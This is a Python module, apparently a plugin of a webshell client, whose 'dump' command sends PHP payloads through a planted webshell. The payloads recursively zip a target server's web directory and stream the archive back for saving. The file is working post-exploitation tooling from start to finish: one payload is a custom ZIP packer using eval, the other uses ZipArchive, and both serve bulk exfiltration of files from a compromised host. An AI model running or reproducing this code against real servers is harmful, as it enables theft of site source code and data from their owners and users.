from libs.config import alias, color, gget
from libs.myapp import send
from os import path, makedirs


def get_raw_php(web_file_path: str):
    return """class eanver{
    public $out = '';
    public function __construct($dir)
    {
        if (@function_exists('gzcompress')) {
            if (count($dir) > 0) {
                foreach ($dir as $file) {
                    if (is_file($file)) {
                        $filecode = implode('', @file($file));
                        if (is_array($dir)) {
                            $file = basename($file);
                        }
                        $this->filezip($filecode, $file);
                    }
                }
                $this->out = $this->packfile();
            }
            return true;
        } else {
            return false;
        }
    }
    public $datasec = array();
    public $ctrl_dir = array();
    public $eof_ctrl_dir = "\\x50\\x4b\\x05\\x06\\x00\\x00\\x00\\x00";
    public $old_offset = 0;
    public function at($atunix = 0){
        $unixarr = ($atunix == 0) ? getdate() : getdate($atunix);
        if ($unixarr['year'] < 1980) {
            $unixarr['year'] = 1980;
            $unixarr['mon'] = 1;
            $unixarr['mday'] = 1;
            $unixarr['hours'] = 0;
            $unixarr['minutes'] = 0;
            $unixarr['seconds'] = 0;
        }
        return (($unixarr['year'] - 1980) << 25) | ($unixarr['mon'] << 21) | ($unixarr['mday'] << 16) | ($unixarr['hours'] << 11) | ($unixarr['minutes'] << 5) | ($unixarr['seconds'] >> 1);
    }
    public function filezip($data, $name, $time = 0){
        $name = str_replace('\\\\', '/', $name);
        $dtime = dechex($this->at($time));
        $hexdtime = '\\x' . $dtime[6] . $dtime[7].'\\x'.$dtime[4].$dtime[5].'\\x'.$dtime[2].$dtime[3].'\\x'.$dtime[0].$dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');
        $fr = "\\x50\\x4b\\x03\\x04";
        $fr .= "\\x14\\x00";
        $fr .= "\\x00\\x00";
        $fr .= "\\x08\\x00";
        $fr .= $hexdtime;
        $unc_len = strlen($data);
        $crc = crc32($data);
        $zdata = gzcompress($data);
        $c_len = strlen($zdata);
        $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $fr .= pack('V', $crc);
        $fr .= pack('V', $c_len);
        $fr .= pack('V', $unc_len);
        $fr .= pack('v', strlen($name));
        $fr .= pack('v', 0);
        $fr .= $name;
        $fr .= $zdata;
        $fr .= pack('V', $crc);
        $fr .= pack('V', $c_len);
        $fr .= pack('V', $unc_len);
        $this->datasec[] = $fr;
        $new_offset = strlen(implode('', $this->datasec));
        $cdrec = "\\x50\\x4b\\x01\\x02";
        $cdrec .= "\\x00\\x00";
        $cdrec .= "\\x14\\x00";
        $cdrec .= "\\x00\\x00";
        $cdrec .= "\\x08\\x00";
        $cdrec .= $hexdtime;
        $cdrec .= pack('V', $crc);
        $cdrec .= pack('V', $c_len);
        $cdrec .= pack('V', $unc_len);
        $cdrec .= pack('v', strlen($name));
        $cdrec .= pack('v', 0);
        $cdrec .= pack('v', 0);
        $cdrec .= pack('v', 0);
        $cdrec .= pack('v', 0);
        $cdrec .= pack('V', 32);
        $cdrec .= pack('V', $this->old_offset);
        $this->old_offset = $new_offset;
        $cdrec .= $name;
        $this->ctrl_dir[] = $cdrec;
    }
    public function packfile(){
        $data = implode('', $this->datasec);
        $ctrldir = implode('', $this->ctrl_dir);
        return $data . $ctrldir . $this->eof_ctrl_dir . pack('v', sizeof($this->ctrl_dir)) . pack('v', sizeof($this->ctrl_dir)) . pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\\x00\\x00";
    }
}
function str_path($path)
{return str_replace('//', '/', $path);}
function do_download($filecode, $file){
    header("Content-type: application/unknown");
    header("Accept-Ranges: bytes");
    header("Content-length: " . strlen($filecode));
    header("Content-Disposition: attachment; filename=" . $file . ";");
    echo $filecode;
}
function do_show($directory)
{
    $array = array();
    $sp = DIRECTORY_SEPARATOR;
    $dir = scandir($directory);
    foreach ($dir as $file) {
        if (is_dir("$directory$sp$file") && $file !== '.' && $file !== '..') {
            $array[] = do_show("$directory$sp$file");
        } else {
            if ($file !== '.' && $file !== '..') {
                $array[] = $file;
            }
        }
    }
    return $array;
}
$fp = "%s";
if (isset($fp)) {
$dir = do_show($fp);
$zip = new eanver($dir);
$out = $zip->out;
do_download($out, $_SERVER['HTTP_HOST'] . ".zip");
}
""" % web_file_path


def get_zip_php(web_file_path: str):
    return """function addFileToZip($path, $zip) {
$sp = DIRECTORY_SEPARATOR;
$handler = opendir($path); //打开当前文件夹由$path指定。
while (($filename = readdir($handler)) !== false) {
if ($filename != "." && $filename != "..") {
if (is_dir($path.$sp.$filename)){
addFileToZip($path.$sp.$filename, $zip);
} else {
$zip->addFile($path.$sp.$filename);
}
}
}
@closedir($path);
}
if (!class_exists("ZipArchive")){
die();
}
$zip = new ZipArchive();
$file_name = $_SERVER["HTTP_HOST"].".zip";
if ($zip->open($file_name, ZipArchive::CREATE) === TRUE) {
addFileToZip("%s", $zip);
$zip->close();
$fp=fopen($file_name,"r");
$file_size=filesize($file_name);
Header("Content-type: application/octet-stream");
Header("Accept-Ranges: bytes");
Header("Accept-Length:".$file_size);
Header("Content-Disposition: attachment; filename=$file_name");
$buffer=1024;
$file_count=0;
while(!feof($fp) && $file_count<$file_size){
$file_con=fread($fp,$buffer);
$file_count+=$buffer;
echo $file_con;
}
fclose($fp);
if($file_count >= $file_size) {
unlink($file_name);
}
}""" % web_file_path


@alias(True, w="web_file_path", l="local_path")
def run(web_file_path: str, local_path: str = "", _raw_php: bool = False):
    """
    dump

    Package and compress files in a folder and download it
    """
    if (_raw_php):
        print(color.yellow(f"Zip compression with raw php can't compress files in subdirectories"))
        php = get_raw_php(web_file_path)
    else:
        php = get_zip_php(web_file_path)
    res = send(f'{php}')
    content = res.r_content
    download_path = local_path or gget("webshell.download_path", "webshell")
    if len(content):
        file_name = gget("webshell.netloc", "webshell") + ".zip" if (not len(local_path)) else ""
        if not path.exists(download_path):
            makedirs(download_path)
        file_path = path.join(download_path, file_name)
        with open(file_path, "wb") as f:
            f.write(content)
        print(color.green(f"Downloaded file has been saved to {file_path}"))
    else:
        print(color.red("File not exist / Download error"))
